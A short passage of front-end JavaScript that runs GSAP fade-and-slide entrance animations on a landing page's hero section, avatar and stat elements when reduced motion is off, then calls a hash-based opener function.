    if (window.gsap && !reduced) {
      gsap.from(".hero .eyebrow, .hero .glitch, .hero .jp, .hero .tagline, .hero .hero-cta", { opacity: 0, y: 24, duration: .7, stagger: .09, ease: "power3.out", delay: .15 });
      gsap.from(".hero-avatar", { opacity: 0, scale: .9, duration: .8, ease: "power3.out" });
      gsap.from(".stat", { opacity: 0, y: 20, duration: .5, stagger: .08, delay: .4 });
    }
    openFromHash();
  });
})();
